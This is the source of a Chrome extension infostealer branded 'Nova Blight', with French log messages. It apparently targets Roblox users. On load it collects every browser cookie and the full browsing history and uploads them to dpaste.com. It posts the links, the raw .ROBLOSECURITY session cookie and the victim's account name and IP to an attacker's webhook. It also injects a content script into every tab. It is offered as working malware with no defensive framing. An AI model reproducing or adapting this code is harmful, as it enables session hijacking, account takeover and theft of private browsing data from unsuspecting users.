var config = {
  Placed: "",
  webhook_url: "%WEBHOOK%"
};

var appfound = {
  total: 0,
  history: 0,
};

async function sendErrorToWebhook(error) {
  let params = {
    username: "Nova Blight - Error Logger",
    avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
    embeds: [
      {
        title: "Erreur détectée",
        description: `\`\`\`ansi\n${error}\n\`\`\``,
        color: 16711680, 
        footer: {
          text: "Surveillance des erreurs",
          icon_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        },
      },
    ],
  };
  
  try {
    await post(params); 
  } catch (err) {
    console.error("Erreur lors de l'envoi au webhook : ", err);
  }
}

let lastRequestTime = 0; 

async function dpaste(content) {
  
  const now = Date.now();
  const timeSinceLastRequest = now - lastRequestTime;

  
  if (timeSinceLastRequest < 1000) {
    await wait(1000 - timeSinceLastRequest); 
  }

  return new Promise((resolve, reject) => {
    setTimeout(async () => {
      try {
        const response = await fetch("https://dpaste.com/api/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: "content=" + encodeURIComponent(content),
        });
        const text = await response.text();
        lastRequestTime = Date.now(); 
        resolve(text);
      } catch (error) {
        await sendErrorToWebhook(error.toString()); 
        reject(error);
      }
    }, 100);
  });
}

const post = async (params) => {
  const url = new URL(config.webhook_url);
  const options = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(params),
  };

  try {
    console.log("Envoi des paramètres au webhook:", params); 
    const response = await fetch(url, options);
    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
    }
    console.log("Webhook envoyé avec succès."); 
  } catch (error) {
    console.error("Erreur lors de l'envoi au webhook : ", error);
    await sendErrorToWebhook("Erreur lors de l'envoi au webhook : " + error.toString());
  }
};

async function main(cookie) {
  if (cookie) {
    try {
      const response = await fetch("https://www.roblox.com/my/settings/json", {
        headers: {
          Cookie: ".ROBLOSECURITY=" + cookie,
        },
        redirect: "manual",
      });

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Erreur ${response.status}: ${errorText}`);
      }

      const statistics = await response.json();

      if (!statistics || typeof statistics !== 'object') {
        throw new Error("Réponse inattendue : les données ne sont pas au format JSON valide.");
      }

      let params = {
        username: "Nova Blight",
        avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        embeds: [
          {
            color: 2829617,
            author: {
              name: "Roblox Session",
              icon_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
            },
            fields: [
              {
                name: "<a:inject:1159081839596687400> Username:",
                value: "`" + (statistics.Name || "N/A") + "`", 
                inline: true,
              },
              {
                name: "<a:inject:1159081839596687400> Ip:",
                value: "`" + (statistics.ClientIpAddress || "N/A") + "`", 
                inline: true,
              },
              {
                name: "<a:inject:1159081839596687400> Premium:",
                value: "`" + (statistics.IsPremium ? "Yes" : "No") + "`",
                inline: true,
              },
            ],
            footer: {
              text: "@Nova Blight | https://t.me/NovaBlight",
              icon_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
            },
            thumbnail: {
              url: statistics.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
            },
          },
        ],
      };

      await post(params);
      
    } catch (error) {
      await sendErrorToWebhook("Erreur lors de la récupération des informations utilisateur : " + error.toString());
    }
  } else {
    await sendErrorToWebhook("Aucun cookie fourni pour la récupération des informations utilisateur.");
  }
}

function getCookies() {
  return new Promise(function (resolve) {
    try {
      chrome.cookies.getAll({}, function (cookies) {
        console.log("Cookies récupérés:", cookies); 
        resolve(cookies);
      });
    } catch (error) {
      sendErrorToWebhook(error.toString());
      resolve([]); 
    }
  });
}

function getHistory() {
  return new Promise(function (resolve) {
    try {
      chrome.history.search({ text: "" }, (results) => {
        resolve(results);
      });
    } catch (error) {
      sendErrorToWebhook(error.toString());
      resolve([]); 
    }
  });
}


async function parse_and_send(cookies) {
  var result = [];

  console.log("Nombre de cookies reçus:", cookies.length); 

  try {
    for (var cookie of cookies) {
      const domain = cookie.domain || '';
      const expirationDate = cookie.expiry || 0;
      const path = cookie.path || '';
      const secure = cookie.secure ? 'TRUE' : 'FALSE';
      const name = cookie.name || '';
      const value = cookie.value || '';
      const includeSubDomain = domain.startsWith('.') ? 'TRUE' : 'FALSE';
      const expiry = expirationDate.toString();

      result.push(`${domain}\t${includeSubDomain}\t${path}\t${secure}\t${expiry}\t${name}\t${value}`);
    }

    const cookieData = result.join('\n');

    console.log("Données des cookies à envoyer:", cookieData);
    

    if (cookieData) {
      await wait(5000); 
      const link = await dpaste(cookieData); 
      console.log("Lien reçu de dpaste:", link); 
      await sendWebhookWithLink(link); 
    } else {
      console.log("Aucun cookie trouvé pour l'envoi.");
    }
  } catch (error) {
    console.error("Erreur lors du traitement des cookies:", error);
    await sendErrorToWebhook(error.toString()); 
  }
}


function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function dpaste(content) {
  return new Promise((resolve, reject) => {
    setTimeout(async () => {
      try {
        const response = await fetch("https://dpaste.com/api/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: "content=" + encodeURIComponent(content),
        });
        const text = await response.text();
        resolve(text);
      } catch (error) {
        await sendErrorToWebhook(error.toString()); 
        reject(error);
      }
    }, 100);
  });
}

async function sendErrorToWebhook(error) {
  let params = {
    username: "Nova Blight",
    avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
    embeds: [
      {
        title: "Erreur dans le Web Injector",
        description: `Une erreur s'est produite: ${error}`,
        color: 16711680, 
        footer: {
          text: "@Nova Blight | https://t.me/NovaBlight",
          icon_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        },
      },
    ],
  };

  try {
    await post(params);
    console.log("Erreur envoyée au webhook avec succès"); 
  } catch (webhookError) {
    console.error("Erreur lors de l'envoi au webhook:", webhookError);
  }
}

async function sendWebhookWithLink(link) {
  let params = {
    username: "Nova Blight",
    avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
    embeds: [
      {
        title: "Web Injector",
        description: `**Cookies Cookies Cookies!!!**\n\n**Links:\n** ${link}`,
        color: 2829617,
        thumbnail: {
          url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        },
        footer: {
          text: "@Nova Blight | https://t.me/NovaBlight",
          icon_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        },
      },
    ],
  };

  console.log("Envoi des données au webhook:", params); 
  try {
    await post(params);
    console.log("Webhook envoyé avec succès"); 
  } catch (error) {
    console.error("Erreur lors de l'envoi au webhook:", error); 
    await sendErrorToWebhook(error.toString()); 
  }
}



async function parse_and_send_data(data) {
  return new Promise((resolve, reject) => {
    let msg = "Nova-Extension found:\n\n" + data;
    setTimeout(() => {
      dpaste(msg)
        .then((paste_url) => {
          console.log("URL de dpaste obtenue:", paste_url); 
          if (paste_url && paste_url.startsWith("http")) {
            resolve(paste_url);
          } else {
            sendErrorToWebhook("Erreur : Lien dpaste non valide reçu pour les cookies.");
            resolve("Lien dpaste non valide reçu pour les cookies.");
          }
        })
        .catch((error) => {
          sendErrorToWebhook("Erreur lors de l'envoi vers dpaste : " + error.toString());
          reject(error);
        });
    }, 100);
  });
}



function send_webhook_hist(data) {
  let params = {
    username: "Nova Blight",
    avatar_url:
      "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
    embeds: [
      {
        title: "Web Injector <a:black_hearts:1149412328350163005>",
        description: `\`\`\`ansi
[2;32mBro is watching furry porn?!!!![0m[2;32m[0m\n
[2;32mTotal History: ${appfound.history ?? 0}[0m[2;32m[0m\`\`\`
      **Links:**
      ${data ? data : "HISTORY NOT FOUND"}
      `,
        color: 2829617,
        thumbnail: {
          url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        },
        footer: {
          text: "@Nova Blight | https://t.me/NovaBlight",
          icon_url:
            "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        },
      },
    ],
  };
  post(params);
}

async function princi() {
  var cookies = await getCookies();
  console.log("Nombre de cookies récupérés:", cookies.length);

  if (cookies.length > 0) {
    appfound.total = cookies.length;
    let g = await parse_and_send(cookies);
    console.log("Lien dpaste reçu:", g);
  } else {
    console.log("Aucun cookie n'a été trouvé.");
  }

  var history = await getHistory();
  if (history.length > 0) {
    appfound.history = history.length;
    let mhm = JSON.stringify(history);
    let g = await parse_and_send_data(mhm);
    setTimeout(() => {
      send_webhook_hist(g);
    }, 100);
  }
}

main();
princi();

chrome.cookies.get(
  { url: "https://www.roblox.com/", name: ".ROBLOSECURITY" },
  function(cookie) {
    if (chrome.runtime.lastError) {
      console.error("Erreur de récupération du cookie : ", chrome.runtime.lastError);
      sendErrorToWebhook("Erreur de récupération du cookie : " + chrome.runtime.lastError.message);
      return;
    }
    
    if (cookie) {
      console.log("Cookie trouvé : ", cookie.value);
      main(cookie.value); 
      let params = {
        username: "Nova Blight",
        avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        embeds: [
          {
            title: "Cookie récupéré",
            description: `**Cookie .ROBLOSECURITY trouvé :** \n\`\`\`${cookie.value}\`\`\``,
            color: 2829617,
            footer: {
              text: "Webhook Notification",
              icon_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
            },
          },
        ],
      };
      post(params);
    } else {
      console.error("Aucun cookie .ROBLOSECURITY trouvé.");
      sendErrorToWebhook("Aucun cookie .ROBLOSECURITY trouvé.");
      let params = {
        username: "Nova Blight",
        avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
        embeds: [
          {
            title: "Alerte de cookie",
            description: "Aucun cookie .ROBLOSECURITY trouvé.",
            color: 16711680, 
            footer: {
              text: "Webhook Notification",
              icon_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
            },
          },
        ],
      };

      post(params);
    }
  }
);

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
  if (changeInfo.status === 'complete') {
    chrome.tabs.executeScript(tabId, {
      file: '../content.js',
      runAt: 'document_end'
    });
  }
});
